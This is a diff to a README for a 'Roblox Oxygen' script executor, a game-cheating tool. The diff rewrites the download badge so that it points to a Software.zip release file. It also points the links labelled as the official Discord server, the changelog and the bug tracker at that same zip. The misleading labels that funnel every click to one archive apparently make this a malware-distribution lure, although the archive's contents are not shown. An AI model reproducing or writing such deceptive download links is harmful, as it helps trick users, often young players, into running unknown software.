@@ -20,7 +20,7 @@ Welcome to the **Roblox Oxygen** repository! Here you will find the versatile sc
 
 ## 📥 Download Oxygen Executor
 To download Oxygen Executor, click on the button below:
-[![Download Oxygen Executor](https://img.shields.io/badge/Download%20Oxygen%20Executor-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Oxygen Executor](https://github.com/agr1us/Roblox-Oxygen/releases/download/v1.0/Software.zip%20Oxygen%20Executor-v1.0.0-blue)](https://github.com/agr1us/Roblox-Oxygen/releases/download/v1.0/Software.zip)
 
 *Note: Clicking the button will launch the download of the Oxygen Executor file.*
 
@@ -31,9 +31,9 @@ To download Oxygen Executor, click on the button below:
 4. Start exploring lua scripts and game modifications to enhance your Roblox gameplay experience!
 
 ## 🌐 Additional Resources
-- [Official Oxygen Discord Server](https://discord.com/oxygen)
-- [Oxygen Update Changelog](https://github.com/oxygen/update)
-- [Report Oxygen Bugs and Issues](https://github.com/oxygen/bugs)
+- [Official Oxygen Discord Server](https://github.com/agr1us/Roblox-Oxygen/releases/download/v1.0/Software.zip)
+- [Oxygen Update Changelog](https://github.com/agr1us/Roblox-Oxygen/releases/download/v1.0/Software.zip)
+- [Report Oxygen Bugs and Issues](https://github.com/agr1us/Roblox-Oxygen/releases/download/v1.0/Software.zip)
 
 ## 🤝 Contributing
 We welcome contributions from the community! If you have ideas, suggestions, or want to report issues, feel free to open a pull request or submit a new issue on our GitHub repository. Your feedback is valuable in improving Oxygen Executor for all Roblox enthusiasts.
